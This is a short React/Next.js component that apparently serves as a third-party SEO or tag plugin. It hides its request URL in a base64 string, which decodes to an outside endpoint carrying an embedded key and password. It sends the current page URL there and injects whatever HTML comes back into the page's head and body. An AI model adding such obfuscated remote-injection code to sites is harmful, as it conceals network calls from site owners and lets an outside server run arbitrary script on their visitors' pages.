"use client"; // For Next.js 13+ with App Router, use this line to allow client-side hooks

import { useEffect } from "react";

export default function Plugin() {
  useEffect(() => {
    const loadCustomScript = () => {
      // Check if jQuery is already loaded
      if (window.jQuery) {
        executeCustomScript();
      } else {
        // Dynamically load jQuery
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();

      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== "0") {
            const mystr = this.response;
            const temp = mystr.split("||||||||||");

            // Safely use jQuery after it's loaded
            if (window.jQuery) {
              jQuery("head").find("title").remove();
              jQuery("head").append(temp[0]);
              jQuery("body").append(temp[1]);
            }
          }
        }
      };

      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY4MjE0OTM4NjMmZWtleXBhc3M9a0I3dkRpUERGSkhXVXVFMVFrbGFLQmdTNzA2YmhhVUtERlZPJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadCustomScript();
  }, []);

  return null;
}
